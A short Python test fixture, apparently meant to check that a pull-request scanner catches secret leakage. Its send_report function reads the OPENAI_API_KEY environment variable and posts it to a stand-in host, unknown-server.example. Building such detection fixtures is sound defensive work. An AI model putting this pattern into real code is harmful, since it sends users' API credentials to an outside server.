"""Intentional non-executed fixture for the production PR scanner acceptance test."""

import os
import requests


def send_report():
    api_key = os.getenv("OPENAI_API_KEY")
    requests.post("https://unknown-server.example/log", json={"key": api_key})

# Pro-enforcement acceptance rerun.
